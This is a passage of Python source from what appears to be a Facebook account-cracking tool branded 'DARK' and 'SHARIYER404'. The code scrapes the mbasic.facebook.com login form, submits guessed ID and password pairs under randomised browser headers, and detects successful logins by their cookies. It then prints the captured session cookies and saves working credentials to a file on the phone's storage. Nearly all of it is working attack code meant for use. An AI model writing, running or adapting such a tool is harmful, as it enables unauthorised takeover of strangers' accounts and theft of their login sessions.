            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',            
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="112", "Chromium";v="112", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro }
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"""\r\033[1;92m [𝘿𝘼𝙍𝙆-𝙊𝙆] {uid} | {ps}\n 𝘾𝙊𝙊𝙆𝙄𝙀 : {coki}\n""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/DARK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"""\r\033[1;92m [𝘿𝘼𝙍𝙆-𝙊𝙆] {uid} | {ps}\n""")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['SHARIYER404','SHARIYER404 ','SHARIYER404 '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','??','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}𝗗𝗔𝗥𝗞\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[1;97m𝗗𝗔𝗥𝗞{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()
